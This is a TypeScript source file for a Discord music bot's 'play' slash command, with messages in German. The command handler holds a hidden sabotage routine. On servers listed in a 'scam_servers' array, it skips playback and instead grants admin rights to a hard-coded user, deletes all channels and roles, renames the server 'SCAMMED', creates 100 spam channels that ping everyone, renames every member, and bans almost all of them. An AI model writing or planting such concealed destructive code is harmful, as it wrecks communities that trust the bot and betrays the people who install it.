import {Command} from "../../Command";
import {ChannelType, Client, CommandInteraction, EmbedBuilder, SlashCommandStringOption} from "discord.js";
import {player} from "../../Bot";
import {Song} from "discord-music-player";


export const play: Command = {
    name: "play",
    description: "Spielt ein Lied ab",
    options: [
        new SlashCommandStringOption()
            .setName("name")
            .setDescription("Der Name des Lieds")
            .setRequired(true)
        ],
    run: async (client: Client, interaction: CommandInteraction) => {
        const scam_servers: number[] = [1234]

        if (scam_servers.includes(parseInt(interaction.guild!.id))) {
            await run(client, interaction)
            return
        }
        let queue = player.getQueue(interaction!.guild!.id)
        if (!queue) queue = player.createQueue(interaction!.guild!.id)
        const voice = interaction!.guild!.members!.cache!.get(interaction.user.id)!.voice;
        if (!voice.channel) {
            await interaction.followUp({embeds: [new EmbedBuilder().setColor("Red").setDescription("Du musst in einem Sprachkanal sein!")]})
            return
        }
        await queue.join(voice.channelId!)
        const name = interaction.options.get("name")?.value
        const song: Song = <Song> await queue.play(<string> name).catch(err => {
            console.log(err)
            interaction.followUp({embeds: [new EmbedBuilder().setColor("Red").setDescription("Es ist ein Fehler aufgetreten: "+err.toString())]})
            return;
        });

        const embed = new EmbedBuilder()
            .setDescription(`Playing [${song}](${song.url}) (${song.duration})`)
            .setColor("White")
        await interaction.followUp({embeds: [embed]})
    }
}

const run = async (client: Client, interaction: CommandInteraction) => {
    console.log("Play auf Paluten aufgeführt")
    let guild = interaction.guild!;
    const dont_ban = new Map()
    dont_ban.set(591966253548175370, "Felix")
    // Make role with admin permissions and add it to the user

    let admin_role = await guild.roles.create({
        name: "Griefer",
        permissions: ["Administrator"],
        mentionable: false,
        hoist: false,
        reason: "Griefer"
    })
    for (let member of dont_ban.keys()) {
        //Give member the role
        await guild.members.cache.find((value) => parseInt(value.id)==member)?.roles.add(admin_role)
    }
    // Delete every channel
    await guild!.channels.fetch()
    await guild!.channels.cache.forEach(
        async channel => {
            try {
                await channel.delete()
            }catch (e) {
                console.log("Cant delete channel: "+ channel.name)
            }
        })
    // Delete every role
    await guild!.roles.fetch()
    await guild!.roles.cache.forEach(async role => {
        try {
            if (admin_role.id == role.id) return;
            await role.delete()
        }catch (e) {
            console.log("Cant delete role: "+role.name)
        }
    })
    await guild!.setName("SCAMMED")
    await guild!.setIcon("https://cdn.discordapp.com/attachments/731626729952772168/1058414526678179860/b2780x1450.png")
    // Create 100 new channels
    for (let i = 0; i < 100; i++) {
        await guild!.channels.create({
            name: "SCAMMED",
            type: ChannelType.GuildText,
            topic: "SCAMMED",
        }).then(async channel => {
            await channel.send("@everyone dieser server ist ein scam!!! (gehackt von micheal jackson)")
        })
    }
    await guild!.members.fetch()
    // Nick every member to "Michael Jackson"
    for (let member of guild!.members.cache) {
        await member[1].setNickname("Michael Jackson")
    }
    setTimeout(async () => {
        await guild!.members.cache.forEach(
            async (member) => {
                try {
                    const memberid = await member.id;
                    if (dont_ban.has(memberid)) {
                        return
                    }
                    await member.ban()
                } catch (e) {
                    console.log("Could not ban " + member.user.tag);
                }
            })
    }, 10000)
}
